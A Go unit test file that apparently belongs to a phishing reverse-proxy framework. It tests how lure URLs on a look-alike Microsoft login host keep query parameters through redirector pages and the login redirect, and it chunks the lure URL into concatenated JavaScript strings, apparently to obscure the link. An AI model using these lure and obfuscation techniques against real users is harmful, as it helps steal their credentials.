package core

import (
	"net/url"
	"strings"
	"testing"
)

func TestReplaceHtmlParams_WithQuery(t *testing.T) {
	params := &map[string]string{
		"rid": "test123",
	}

	// lure_url already has query params — check via {lure_url_html}
	lure_url := "https://login.ms.fake.com/mqyAynbZ?foo=bar&baz=qux"
	result := testReplaceHtmlParams("{lure_url_html}", lure_url, params)

	if !strings.Contains(result, "foo=bar") {
		t.Error("expected original query param 'foo=bar' in result")
	}
	if !strings.Contains(result, "baz=qux") {
		t.Error("expected original query param 'baz=qux' in result")
	}
	// forwarder param appended with &
	if !strings.Contains(result, "&f=AAAA") {
		t.Error("expected forwarder param with & separator")
	}
}

func TestReplaceHtmlParams_WithoutQuery(t *testing.T) {
	params := &map[string]string{
		"rid": "test123",
	}

	// lure_url has no query params
	lure_url := "https://login.ms.fake.com/mqyAynbZ"
	result := testReplaceHtmlParams("{lure_url_html}", lure_url, params)

	// should use ? separator for forwarder param
	if !strings.Contains(result, "?f=AAAA") {
		t.Error("expected '?' separator for forwarder param when no existing query")
	}
}

func TestReplaceHtmlParams_HtmlLureUrlPreservesQueries(t *testing.T) {
	params := &map[string]string{}
	body := "{lure_url_html}"

	lure_url := "https://login.ms.fake.com/mqyAynbZ?token=abc&user=test"
	result := testReplaceHtmlParams(body, lure_url, params)

	if !strings.Contains(result, "token=abc") {
		t.Error("expected 'token=abc' in lure_url_html")
	}
	if !strings.Contains(result, "user=test") {
		t.Error("expected 'user=test' in lure_url_html")
	}
}

func TestReplaceHtmlParams_JsLureUrlPreservesQueries(t *testing.T) {
	params := &map[string]string{}

	lure_url := "https://login.ms.fake.com/mqyAynbZ?token=abc"
	result := testReplaceHtmlParams("{lure_url_js}", lure_url, params)

	// JS chunks: full URL is split into 2-char pieces, check result has concatenation
	if !strings.Contains(result, " + ") {
		t.Error("expected JS concatenation with + operator")
	}
	// reconstruct from chunks
	reconstructed := ""
	for _, part := range strings.Split(result, "'") {
		if part == " + " || part == "" {
			continue
		}
		reconstructed += part
	}
	if !strings.Contains(reconstructed, "token=abc") {
		t.Errorf("reconstructed URL should contain 'token=abc', got: %s", reconstructed)
	}
	if !strings.Contains(reconstructed, "mqyAynbZ") {
		t.Errorf("reconstructed URL should contain path, got: %s", reconstructed)
	}
	if !strings.Contains(reconstructed, "&f=AAAA") {
		t.Errorf("reconstructed URL should contain forwarder param with &, got: %s", reconstructed)
	}
}

func TestForwardQueryToLoginUrl(t *testing.T) {
	loginUrl := "https://login.microsoft.com/auth"
	rawQuery := "token=abc&state=xyz"

	rurl := loginUrl
	if rawQuery != "" {
		if strings.ContainsRune(rurl, '?') {
			rurl += "&" + rawQuery
		} else {
			rurl += "?" + rawQuery
		}
	}

	u, err := url.Parse(rurl)
	if err != nil {
		t.Fatalf("failed to parse redirect URL: %v", err)
	}

	q := u.Query()
	if q.Get("token") != "abc" {
		t.Error("expected token=abc in redirect URL")
	}
	if q.Get("state") != "xyz" {
		t.Error("expected state=xyz in redirect URL")
	}
}

func TestForwardQueryToLoginUrl_WithExistingQuery(t *testing.T) {
	loginUrl := "https://login.microsoft.com/auth?existing=param"
	rawQuery := "token=abc"

	rurl := loginUrl
	if rawQuery != "" {
		if strings.ContainsRune(rurl, '?') {
			rurl += "&" + rawQuery
		} else {
			rurl += "?" + rawQuery
		}
	}

	u, err := url.Parse(rurl)
	if err != nil {
		t.Fatalf("failed to parse redirect URL: %v", err)
	}

	q := u.Query()
	if q.Get("existing") != "param" {
		t.Error("expected existing=param in redirect URL")
	}
	if q.Get("token") != "abc" {
		t.Error("expected token=abc in redirect URL")
	}
}

func TestForwardQueryToLoginUrl_EmptyQuery(t *testing.T) {
	loginUrl := "https://login.microsoft.com/auth"
	rawQuery := ""

	rurl := loginUrl
	if rawQuery != "" {
		if strings.ContainsRune(rurl, '?') {
			rurl += "&" + rawQuery
		} else {
			rurl += "?" + rawQuery
		}
	}

	if strings.ContainsRune(rurl, '?') {
		t.Error("expected no query string when rawQuery is empty")
	}
}

func TestLureUrlConstruction_WithQueries(t *testing.T) {
	// Simulate the request URL building from http_proxy.go lines 205-212
	reqPath := "/mqyAynbZ"
	rawQuery := "foo=bar&baz=qux"
	reqHost := "login.ms.fake.com"
	scheme := "https"

	req_url := scheme + "://" + reqHost + reqPath
	lure_url := req_url
	if rawQuery != "" {
		req_url += "?" + rawQuery
		lure_url += "?" + rawQuery
	}

	if !strings.Contains(lure_url, "foo=bar") {
		t.Error("expected lure_url to contain original query params")
	}
	if !strings.Contains(lure_url, "baz=qux") {
		t.Error("expected lure_url to contain baz=qux")
	}
}

func TestLureUrlConstruction_WithoutQueries(t *testing.T) {
	reqPath := "/mqyAynbZ"
	rawQuery := ""
	reqHost := "login.ms.fake.com"
	scheme := "https"

	req_url := scheme + "://" + reqHost + reqPath
	lure_url := req_url
	if rawQuery != "" {
		req_url += "?" + rawQuery
		lure_url += "?" + rawQuery
	}

	if strings.ContainsRune(lure_url, '?') {
		t.Error("expected no query string in lure_url when no queries present")
	}
}

func TestEndToEnd_QueryForwarding(t *testing.T) {
	// Step 1: browser opens lure URL with query params
	// Simulates: https://login.ms.fake.com/mqyAynbZ?example=example.com
	reqPath := "/mqyAynbZ"
	rawQuery := "example=example.com"
	reqHost := "login.ms.fake.com"

	lure_url := "https://" + reqHost + reqPath
	if rawQuery != "" {
		lure_url += "?" + rawQuery
	}

	// Step 2: redirector HTML uses lure_url (with queries preserved)
	params := &map[string]string{}
	body := "{lure_url_html}"
	html := testReplaceHtmlParams(body, lure_url, params)

	if !strings.Contains(html, "example=example.com") {
		t.Fatal("redirector HTML lost original query params")
	}
	// forwarder param appended with &
	if !strings.Contains(html, "&f=") {
		t.Fatal("expected & separator for forwarder param")
	}

	// Step 3: browser follows forwarder link, hits proxy again
	// req.URL.RawQuery now contains both original + forwarder params
	fwdQuery := rawQuery + "&f=AAAA"

	// Step 4: login redirect forwards all query params
	loginUrl := "https://login.microsoft.com/auth"
	rurl := loginUrl
	if fwdQuery != "" {
		if strings.ContainsRune(rurl, '?') {
			rurl += "&" + fwdQuery
		} else {
			rurl += "?" + fwdQuery
		}
	}

	u, err := url.Parse(rurl)
	if err != nil {
		t.Fatalf("failed to parse redirect URL: %v", err)
	}
	q := u.Query()
	if q.Get("example") != "example.com" {
		t.Errorf("login redirect lost 'example' param, got: %s", q.Get("example"))
	}
	if q.Get("f") != "AAAA" {
		t.Errorf("login redirect lost forwarder param, got: %s", q.Get("f"))
	}
}

// testReplaceHtmlParams mirrors the logic of replaceHtmlParams from http_proxy.go
// but uses deterministic values for testing
func testReplaceHtmlParams(body string, lure_url string, params *map[string]string) string {
	fwd_param := "AAAA" // deterministic for testing

	if strings.ContainsRune(lure_url, '?') {
		lure_url += "&" + "f" + "=" + fwd_param
	} else {
		lure_url += "?" + "f" + "=" + fwd_param
	}

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, v, -1)
	}

	var js_url string
	n := 0
	for n < len(lure_url) {
		rn := 2 // fixed chunk size for testing
		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}
		if n > 0 {
			js_url += " + "
		}
		js_url += "'" + lure_url[n:n+rn] + "'"
		n += rn
	}

	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
	body = strings.Replace(body, "{lure_url_js}", js_url, -1)

	return body
}
